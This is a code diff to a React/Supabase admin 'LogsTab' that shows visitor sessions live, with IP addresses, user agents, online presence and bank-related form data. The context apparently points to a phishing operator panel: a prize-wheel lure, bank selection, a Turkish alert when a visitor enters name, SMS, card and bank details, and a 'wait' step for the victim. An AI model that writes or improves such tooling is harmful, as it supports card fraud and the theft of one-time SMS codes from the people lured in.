@@ -5,6 +5,7 @@ import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
 import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
@@ -27,6 +28,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   // Presence
   const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
   const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
+  const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
+  const [, setPresenceTick] = useState(0);
 
   const [chatSessionId, setChatSessionId] = useState<string | null>(null);
   const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);
@@ -105,88 +108,81 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
     const channel = supabase
       .channel("admin1-sessions-live")
       .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
+        if (payload.eventType === "INSERT") {
+          const newRow = payload.new as DemoSession;
+          if (newRow.is_hidden) return;
+          setRows((prev) => {
+            if (prev.some((r) => r.id === newRow.id)) return prev;
+            return [newRow, ...prev].slice(0, 50);
+          });
+          setLogCount((c) => c + 1);
+          return;
+        }
+
+        if (payload.eventType === "DELETE") {
+          const oldRow = payload.old as DemoSession;
+          if (oldRow?.id) {
+            setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
+            setLogCount((c) => Math.max(0, c - 1));
+          }
+          return;
+        }
+
         if (payload.eventType === "UPDATE") {
           const newRow = payload.new as DemoSession;
-          const oldRow = payload.old as DemoSession | null;
-          const onlyPresenceChanged =
-            !!oldRow &&
-            oldRow.current_step === newRow.current_step &&
-            oldRow.amount === newRow.amount &&
-            oldRow.is_hidden === newRow.is_hidden &&
-            oldRow.partner_name === newRow.partner_name &&
-            oldRow.ip_address === newRow.ip_address &&
-            oldRow.user_agent === newRow.user_agent &&
-            JSON.stringify(oldRow.form_data ?? null) === JSON.stringify(newRow.form_data ?? null);
+          const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);
 
-          if (onlyPresenceChanged) {
+          if (newRow.is_hidden) {
+            setRows((prev) => prev.filter((r) => r.id !== newRow.id));
+            setLogCount((c) => Math.max(0, c - 1));
             return;
           }
-        }
 
-        if (soundEnabledRef.current) {
-          if (payload.eventType === "UPDATE") {
-            const newRow = payload.new as DemoSession;
-            const oldRow = rowsRef.current.find(r => r.id === newRow.id);
+          if (soundEnabledRef.current && oldRow) {
+            const getSignificantData = (data: any) => {
+              if (!data) return {};
+              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
+              return rest;
+            };
 
-            if (oldRow) {
-              const getSignificantData = (data: any) => {
-                if (!data) return {};
-                // Banka seçimi gibi sistem veya navigasyon verilerini filtrele
-                const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
-                return rest;
-              };
+            const oldSignificant = getSignificantData(oldRow.form_data);
+            const newSignificant = getSignificantData(newRow.form_data);
+            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
+            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
 
-              const oldSignificant = getSignificantData(oldRow.form_data);
-              const newSignificant = getSignificantData(newRow.form_data);
-
-              const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
-              const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
-
-              if (isFormDataChanged || isUserSubmittedToWait) {
-                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
-              }
+            if (isFormDataChanged || isUserSubmittedToWait) {
+              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
             }
           }
-        }
 
-        void load();
+          setRows((prev) => {
+            const idx = prev.findIndex((r) => r.id === newRow.id);
+            if (idx === -1) return [newRow, ...prev].slice(0, 50);
+            const next = [...prev];
+            next[idx] = { ...next[idx], ...newRow };
+            return next;
+          });
+        }
       })
       .subscribe();
 
     const presenceChannel = supabase.channel("online_visitors", {
       config: { presence: { key: "admin1-logs" } },
     });
+
+    const applyPresence = () => {
+      const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
+      setLiveVisitorCount(parsed.liveVisitorCount);
+      setOnlineSessionIds(new Set(parsed.onlineSessionIds));
+      setSessionPaths(parsed.sessionPaths);
+      setSessionLastSeenAt(parsed.sessionLastSeenAt);
+      setPresenceTick((t) => t + 1);
+    };
+
     presenceChannel
-      .on("presence", { event: "sync" }, () => {
-        const state = presenceChannel.presenceState();
-        let count = 0;
-        const activeIds = new Set<string>();
-        const paths: Record<string, string> = {};
-
-        for (const [, presences] of Object.entries(state)) {
-          const typedPresences = presences as Array<{
-            sessionId?: string | null;
-            pathname?: string;
-          }>;
-          if (typedPresences.length === 0) continue;
-
-          const visitorPresences = typedPresences.filter(
-            (p) => !p.pathname?.startsWith("/admin"),
-          );
-          if (visitorPresences.length === 0) continue;
-
-          count += 1;
-
-          for (const p of visitorPresences) {
-            if (!p.sessionId) continue;
-            activeIds.add(p.sessionId);
-            if (p.pathname) paths[p.sessionId] = p.pathname;
-          }
-        }
-        setLiveVisitorCount(count);
-        setOnlineSessionIds(activeIds);
-        setSessionPaths(paths);
-      })
+      .on("presence", { event: "sync" }, applyPresence)
+      .on("presence", { event: "join" }, applyPresence)
+      .on("presence", { event: "leave" }, applyPresence)
       .subscribe(async (status) => {
         if (status === "SUBSCRIBED") {
           await presenceChannel.track({
@@ -574,7 +570,12 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
               )}
               {rows.map((row) => {
                 const fd = (row.form_data || {}) as Record<string, any>;
-                const isOnline = onlineSessionIds.has(row.id);
+                const isOnline = isSessionLive(
+                  row.id,
+                  onlineSessionIds,
+                  row.status,
+                  sessionLastSeenAt[row.id],
+                );
                 
                 let stepText = "BAŞLANGIÇ";
                 let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
